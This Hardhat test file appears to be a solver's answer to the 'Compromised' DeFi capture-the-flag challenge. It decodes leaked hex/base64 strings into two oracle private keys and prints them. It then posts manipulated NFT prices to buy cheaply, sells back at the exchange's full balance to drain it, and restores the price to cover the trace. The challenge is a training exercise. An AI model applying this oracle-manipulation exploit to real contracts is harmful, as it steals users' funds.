const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
	/*this.oracle.postPrice("DVNFT",0,{sender: "0xA73209FB1a42495120166736362A1DfA9F95A105"});
	this.oracle.postPrice("DVNFT",0,{sender: "0xe92401A4d3af5E446d93D11EEc806b1462b39D15"});
	this.oracle.postPrice("DVNFT",0,{sender: "0x81A5D6E50C214044bE44cA0CB057fe119097850c"});*/

	const leakToPrivateKey = (leak) => {
		const base64 = Buffer.from(leak.split(' ').join(''),'hex').toString('utf8');
		const hexKey = Buffer.from(base64, 'base64').toString('utf8');
		console.log('Private key from base64: %s', hexKey);
		return hexKey;
	}

/*
	compromisedOracles = [
	leakToPrivateKey("4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535"),
	leakToPrivateKey("4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134")
	].map( (privateKeyHex) => {
		return ethers.accounts.privateKeyToAccount(privateKeyHex);
	});
*/
	const hexKey1 = leakToPrivateKey("4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535");
	const hexKey2 = leakToPrivateKey("4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134"); 
	console.log("Private Key 1: %s", hexKey1);
	console.log("Private Key 2: %s", hexKey2);

	const w1 = new ethers.Wallet(hexKey1, ethers.provider);
	const w2 = new ethers.Wallet(hexKey2, ethers.provider);
        const myOracle1 = await this.oracle.connect(w1);
        const myOracle2 = await this.oracle.connect(w2);

	//await ethers.personal.importRawKey("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", "");
	//await ethers.personal.unlockAccount("0xe92401A4d3af5E446d93D11EEc806b1462b39D15", "", 10000000);

	//await ethers.personal.importRawKey("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", "");
	//await ethers.personal.unlockAccount("0x81A5D6E50C214044bE44cA0CB057fe119097850c", "", 10000000);

	//0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
	//0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

/*	this.oracle.postPrice("DVNFT",0,{sender: compromisedOracles[0] });
	this.oracle.postPrice("DVNFT",0,{sender: compromisedOracles[1]});*/
	//this.oracle.postPrice("DVNFT",0,{from: "0xe92401A4d3af5E446d93D11EEc806b1462b39D15" });
	//this.oracle.postPrice("DVNFT",0,{from: "0x81A5D6E50C214044bE44cA0CB057fe119097850c" });
        const medianPriceBefore = await this.oracle.getMedianPrice("DVNFT"); 
	console.log("Median Price Before Oracle: %s", medianPriceBefore  );

	const hackExchange = this.exchange.connect(attacker);
	const hackNFT = this.nftToken.connect(attacker);

	let priceToBuy = ethers.utils.parseEther('0.0000000000000001');

	await myOracle1.postPrice("DVNFT",priceToBuy);
	await myOracle2.postPrice("DVNFT",priceToBuy);
        const medianPrice = await this.oracle.getMedianPrice("DVNFT"); 
	console.log("Median Price After Oracle: %s", medianPrice  );

//	let tokenId = await this.exchange.buyOne({value: 10000});
	let tokenId = await hackExchange.buyOne({value: 10000});

	//console.log("My token id that I bought from exchange: %s", tokenId); //check id
//        this.nftToken.approve(this.exchange.address, 0);
        hackNFT.approve(this.exchange.address, 0);

	//this.oracle.postPrice("DVNFT", ethers.utils.parseEther('10000'),{from: "0xe92401A4d3af5E446d93D11EEc806b1462b39D15" });
	//this.oracle.postPrice("DVNFT", ethers.utils.parseEther('10000'),{from: "0x81A5D6E50C214044bE44cA0CB057fe119097850c" });

	let priceToSell = await ethers.provider.getBalance(this.exchange.address);

	console.log("New Price: %s", priceToSell  );

	await myOracle1.postPrice("DVNFT",priceToSell);
	await myOracle2.postPrice("DVNFT",priceToSell);
        const medianPrice3 = await this.oracle.getMedianPrice("DVNFT"); 
	console.log("Oracles Balance with what was left on the exchange: %s", medianPrice3  );

//	await this.exchange.sellOne(0);
	await hackExchange.sellOne(0);

	await myOracle1.postPrice("DVNFT",INITIAL_NFT_PRICE);
	await myOracle2.postPrice("DVNFT",INITIAL_NFT_PRICE);

	

        //this.exchange.sellOne(tokenId);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
